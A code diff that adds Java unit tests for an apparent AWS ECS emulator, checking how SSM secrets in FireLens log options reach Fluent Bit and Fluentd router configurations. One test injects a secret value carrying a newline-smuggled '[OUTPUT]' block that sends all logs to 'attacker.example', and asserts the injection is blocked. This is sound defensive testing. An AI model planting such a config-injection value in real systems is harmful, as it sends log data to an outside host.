@@ -24,12 +24,14 @@ import io.floci.aws.services.ecs.model.FirelensConfiguration;
 import io.floci.aws.services.ecs.model.LogConfiguration;
 import io.floci.aws.services.ecs.model.NetworkMode;
 import io.floci.aws.services.ecs.model.PortMapping;
+import io.floci.aws.services.ecs.model.Secret;
 import io.floci.aws.services.ecs.model.TaskDefinition;
 import io.floci.aws.services.lambda.launcher.ImageCacheService.LaunchImage;
 import io.floci.aws.services.s3.S3Service;
 import io.floci.aws.services.s3.model.S3Object;
 import io.floci.aws.services.secretsmanager.SecretsManagerService;
 import io.floci.aws.services.ssm.SsmService;
+import io.floci.aws.services.ssm.model.Parameter;
 import io.floci.aws.testing.DockerArchiveUploadFixture;
 import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
 import org.apache.commons.compress.archivers.tar.TarArchiveInputStream;
@@ -47,6 +49,7 @@ import java.io.ByteArrayInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
@@ -66,6 +69,7 @@ import static org.mockito.ArgumentMatchers.anyString;
 import static org.mockito.ArgumentMatchers.eq;
 import static org.mockito.Mockito.RETURNS_DEEP_STUBS;
 import static org.mockito.Mockito.RETURNS_SELF;
+import static org.mockito.Mockito.atLeastOnce;
 import static org.mockito.Mockito.doAnswer;
 import static org.mockito.Mockito.inOrder;
 import static org.mockito.Mockito.mock;
@@ -87,6 +91,7 @@ class EcsContainerManagerFirelensTest {
     private byte[] uploadedArchive;
     private EcsContainerManager manager;
     private EmulatorConfig config;
+    private SsmService ssmService;
 
     @BeforeEach
     void setUp() {
@@ -134,8 +139,9 @@ class EcsContainerManagerFirelensTest {
         when(ecrRegistryManager.rewriteImageUri(anyString())).thenAnswer(inv -> inv.getArgument(0));
 
         s3Service = mock(S3Service.class);
+        ssmService = mock(SsmService.class);
         manager = new EcsContainerManager(containerBuilder, lifecycleManager, logStreamer,
-                containerDetector, config, regionResolver, awsEnv, mock(SsmService.class),
+                containerDetector, config, regionResolver, awsEnv, ssmService,
                 mock(SecretsManagerService.class), s3Service, ecrRegistryManager, new HostVolumePolicy(config));
     }
 
@@ -239,6 +245,94 @@ class EcsContainerManagerFirelensTest {
         assertTrue(!conf.contains("Endpoint"));
     }
 
+    @Test
+    void awsfirelensSecretOptionsReachTheRouterOutputBesideTheOptions() {
+        when(ssmService.getParameter("/datadog/api-key", "us-east-1"))
+                .thenReturn(new Parameter("/datadog/api-key", "resolved-api-key", "SecureString"));
+
+        startTaskWithSecretOption("fluentbit", Map.of("Name", "datadog", "provider", "ecs"));
+
+        String conf = readFluentBitConf(new ByteArrayInputStream(uploadedArchive));
+        assertTrue(conf.contains("    apikey ${apikey_0}\n"), conf);
+        assertTrue(conf.contains("    provider ecs\n"), conf);
+        assertTrue(routerAndAppEnv().contains("apikey_0=resolved-api-key"));
+    }
+
+    @Test
+    void awsfirelensSecretOptionsReachAFluentdRouterOutput() {
+        when(ssmService.getParameter("/datadog/api-key", "us-east-1"))
+                .thenReturn(new Parameter("/datadog/api-key", "resolved-api-key", "SecureString"));
+
+        startTaskWithSecretOption("fluentd", Map.of("@type", "datadog"));
+
+        String conf = readFluentBitConf(new ByteArrayInputStream(uploadedArchive));
+        assertTrue(conf.contains("    apikey \"#{ENV['apikey_0']}\"\n"), conf);
+        assertTrue(routerAndAppEnv().contains("apikey_0=resolved-api-key"));
+    }
+
+    @Test
+    void awsfirelensSecretOptionValueCannotAddDirectivesToTheRouterConfig() {
+        String value = "key\n\n[OUTPUT]\n    Name http\n    Match *\n    Host attacker.example";
+        when(ssmService.getParameter("/datadog/api-key", "us-east-1"))
+                .thenReturn(new Parameter("/datadog/api-key", value, "SecureString"));
+
+        startTaskWithSecretOption("fluentbit", Map.of("Name", "datadog"));
+
+        String conf = readFluentBitConf(new ByteArrayInputStream(uploadedArchive));
+        assertFalse(conf.contains("attacker.example"), conf);
+        assertFalse(conf.contains("Name http"), conf);
+        assertTrue(routerAndAppEnv().contains("apikey_0=" + value));
+    }
+
+    @Test
+    void awsfirelensSecretOptionThatCannotBeResolvedFailsTheTaskBeforeAnyContainerIsCreated() {
+        when(ssmService.getParameter("/datadog/api-key", "us-east-1"))
+                .thenThrow(new AwsException("ParameterNotFound", "Parameter /datadog/api-key not found.", 400));
+
+        AwsException ex = assertThrows(AwsException.class,
+                () -> startTaskWithSecretOption("fluentbit", Map.of("Name", "datadog")));
+        assertEquals("ResourceInitializationError", ex.getErrorCode());
+        verify(lifecycleManager, never()).create(any(ContainerSpec.class), any());
+        verify(lifecycleManager, never()).createAndStartEphemeral(any(ContainerSpec.class), any());
+    }
+
+    /** Starts an app container, first in the task, whose awsfirelens output takes {@code apikey} from SSM. */
+    private void startTaskWithSecretOption(String routerType, Map<String, String> options) {
+        ContainerDefinition router = new ContainerDefinition();
+        router.setName("log_router");
+        router.setImage("amazon/aws-for-fluent-bit:stable");
+        router.setFirelensConfiguration(new FirelensConfiguration(routerType, Map.of()));
+
+        ContainerDefinition app = new ContainerDefinition();
+        app.setName("app");
+        app.setImage("app:latest");
+        app.setLogConfiguration(new LogConfiguration("awsfirelens", options,
+                List.of(new Secret("apikey", "/datadog/api-key"))));
+
+        TaskDefinition taskDef = new TaskDefinition();
+        taskDef.setFamily("firelens-secrets");
+        taskDef.setRevision(1);
+        taskDef.setNetworkMode(NetworkMode.awsvpc);
+        taskDef.setContainerDefinitions(List.of(app, router));
+
+        EcsTask task = new EcsTask();
+        task.setTaskArn("arn:aws:ecs:us-east-1:000000000000:task/test-cluster/abc123");
+        task.setClusterArn("arn:aws:ecs:us-east-1:000000000000:cluster/test-cluster");
+
+        manager.startTask(task, taskDef, null, "us-east-1");
+    }
+
+    /** Every environment entry handed to the container builder, which the router and the app share here. */
+    private List<String> routerAndAppEnv() {
+        @SuppressWarnings("unchecked")
+        ArgumentCaptor<List<String>> env = ArgumentCaptor.forClass(List.class);
+        verify(builder, atLeastOnce()).withEnv(env.capture());
+        List<String> entries = new ArrayList<>();
+        for (List<String> containerEnv : env.getAllValues()) {
+            entries.addAll(containerEnv);
+        }
+        return entries;
+    }
 
     @Test
     void writesS3ExternalConfigBesideTheGeneratedFluentBitConfig() {
